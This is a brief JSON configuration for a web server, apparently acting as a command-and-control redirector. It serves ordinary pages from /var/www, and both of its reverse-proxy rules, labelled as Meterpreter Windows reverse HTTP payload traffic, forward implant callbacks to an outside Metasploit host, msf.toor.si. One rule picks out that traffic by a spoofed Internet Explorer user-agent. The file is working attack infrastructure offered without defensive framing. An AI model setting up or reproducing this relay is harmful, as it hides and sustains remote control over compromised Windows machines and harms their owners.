{
    "Hostname": "localhost",
    "Protocols": [ "plain" ],
    "Port": 8000,
    "TLSPort": 8443,
    "TLSKey": "server.key",
    "TLSCert": "server.crt",
    "Root": "/var/www",
    "Index": "index.htm",
    "Verbose": 2,
    "LogFile": "",
    "Proxy": [
      {
        "type": "reverse",
        "description": "Meterpreter Windows Reverse HTTP Payload",
        "match": "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
        "target": "https://msf.toor.si:443"
      },
      {
        "type": "reverse",
        "description": "Meterpreter Windows Reverse HTTP Payload (Early)",
        "match": "",
        "target": "https://msf.toor.si:443"
      }
    ]
}
